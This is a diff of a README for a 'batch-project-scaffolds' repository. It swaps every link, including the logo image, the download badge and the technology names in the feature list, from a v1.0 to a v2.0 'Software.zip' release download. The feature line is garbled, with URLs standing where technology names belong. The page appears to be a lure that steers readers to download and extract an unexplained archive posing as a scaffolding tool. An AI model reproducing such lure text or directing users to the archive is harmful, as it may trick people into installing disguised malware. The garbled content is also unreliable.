@@ -1,6 +1,6 @@
 # 🚀 Welcome to batch-project-scaffolds 🚀
 
-![Batch Project Scaffolds Logo](https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v1.0/Software.zip)
+![Batch Project Scaffolds Logo](https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v2.0/Software.zip)
 
 ### Streamlined project scaffolding through automated batch scripts.
 
@@ -24,7 +24,7 @@ Welcome to the **batch-project-scaffolds** repository, where we focus on making 
 ## Features
 🔹 Streamlined project scaffolding process  
 🔹 Automated batch scripts for setup  
-🔹 Supports various technologies like JavaScript, https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v1.0/Software.zip, TypeScript, https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v1.0/Software.zip, Prisma, Supabase  
+🔹 Supports various technologies like JavaScript, https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v2.0/Software.zip, TypeScript, https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v2.0/Software.zip, Prisma, Supabase  
 🔹 Windows automation for ease of use
 
 ---
@@ -32,7 +32,7 @@ Welcome to the **batch-project-scaffolds** repository, where we focus on making 
 ## Installation
 To get started with **batch-project-scaffolds**, you can download the latest release from the following link:
 
-[![Download Latest Release](https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v1.0/Software.zip)
+[![Download Latest Release](https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/davinjoeevano/batch-project-scaffolds/releases/download/v2.0/Software.zip)
 
 Click the button above to download the latest release. Once downloaded, extract the files and you are all set! If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative download sources.
 
